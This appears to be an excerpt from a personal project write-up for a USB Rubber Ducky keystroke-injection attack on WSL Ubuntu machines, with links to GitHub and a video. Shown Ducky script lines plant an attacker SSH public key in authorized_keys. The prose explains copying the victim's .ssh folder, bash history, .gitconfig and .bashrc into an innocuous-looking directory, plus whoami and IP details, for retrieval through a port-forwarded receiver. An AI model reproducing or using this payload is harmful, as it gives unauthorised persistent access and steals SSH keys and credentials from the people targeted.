...
|     |  |
| -------- | ------- |
| [**Github Link**](https://github.com/rahul-sharma-project/ssh_rubber_ducky)  | [**Video Example**](https://youtu.be/WF8u6rfgFls)    |
...
## Making the receiver and port forwarding it

Next issue is with how I handle the receiver. Considering that the live test for this will be done on university campus, I needed a method of accessing my server outside. 
...
``` 
GUI r              // This pushes Win + R
DELAY 250          // Wait 250ms
STRING ubuntu      // Types in "ubuntu"
DELAY 250          // Wait 250ms
ENTER              // Hit enter
...
```
 STRING echo (PUBLIC KEY) sample@host >> \~/.ssh/authorized_keys 
 ENTER
```

The second component of the attack is a bit different, here first think we do is make a copy of their `.ssh` directory in their root directory called something innocuous like `temp_dir` in this case so that if there is an interruption or failure at any point, it will not look too suspicious having the `temp_dir` directory in the root. Not only am I also going to steal their `.ssh` folder, I will take their bash history so I can see where they may frequently `ssh` into and their `.gitconfig` to see if there are any aliases they may have set up in the configuration. I'll also take their `.bashrc` to see if there are any ssh aliases stored in there at all. You also may notice the `whoami` and `ip a`. This is to obtain the user account and the name of the ip address of where the system is located.
...
ENTER
STRING (whoami && ipa) >> ~/temp_dir/.details
ENTER
```
...
sample@host:~$ cd rahul/

sample@host:~/home/rahul$ 1s
> temp_dir

sample@host:~/home/rahul$ cd temp_dir/
